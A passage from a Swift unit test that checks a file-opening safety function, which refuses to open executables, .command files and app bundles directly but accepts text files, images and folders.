        FileManager.default.createFile(atPath: script, contents: Data("#!/bin/sh\n".utf8), attributes: [.posixPermissions: 0o755])
        XCTAssertFalse(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("run.command").path))
        XCTAssertFalse(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("Evil.app").path))
        XCTAssertFalse(OpenSafety.canOpenDirectly(path: script))
        XCTAssertTrue(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("notes.txt").path))
        XCTAssertTrue(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("pic.png").path))
        XCTAssertTrue(OpenSafety.canOpenDirectly(path: dir.path))
        try? FileManager.default.removeItem(at: dir)
    }
}
